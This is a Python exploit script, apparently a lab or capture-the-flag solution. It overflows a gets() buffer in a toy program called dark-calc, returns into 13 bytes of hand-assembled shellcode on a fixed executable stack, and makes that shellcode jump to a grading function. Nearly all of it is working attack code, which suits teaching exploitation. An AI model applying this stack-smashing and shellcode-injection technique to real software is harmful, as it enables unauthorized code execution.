#!/usr/bin/env python3
"""Task 2: inject and run shellcode on the (executable) fixed stack.

dark-calc mmap()s 0x802000 RWX bytes at the fixed address
0x721000000000 (init_fixed_stack) and __wrap_main moves rsp to its top
(0x721000801000), so stack addresses never change: expression starts
at 0x721000800fd0, and gets() has exactly 48 bytes of usable space up
to the PROT_NONE guard page at 0x721000801000.

The overflow returns to a 13-byte shellcode right after the return
address (at 0x721000800ff0):

    push rax            ; rsp -= 8: realign so printf does not crash (movaps)
    mov edi, 4          ; grade argument
    mov eax, grade_eval ; 0x401a87
    jmp rax             ; prints "Hope A will be your grade!"

grade_eval stores edi at its [rbp-0x4] and checks it, so the call path
is taken.  Because jmp (not call) is used and the return slot on the
stack still holds the shellcode address, grade_eval's ret simply jumps
back into the shellcode; the loop is harmless: the message is printed
and flushed on every iteration.
"""
import struct
import sys

payload = b"A" * 24
payload += struct.pack("<Q", 0x721000800FF0)  # shellcode on the fixed stack
payload += b"\x50"                            # push rax (rsp -= 8)
payload += b"\xbf\x04\x00\x00\x00"            # mov edi, 4
payload += b"\xb8\x87\x1a\x40\x00"            # mov eax, 0x401a87 (grade_eval)
payload += b"\xff\xe0"                        # jmp rax
payload += b"\n"

sys.stdout.buffer.write(payload)
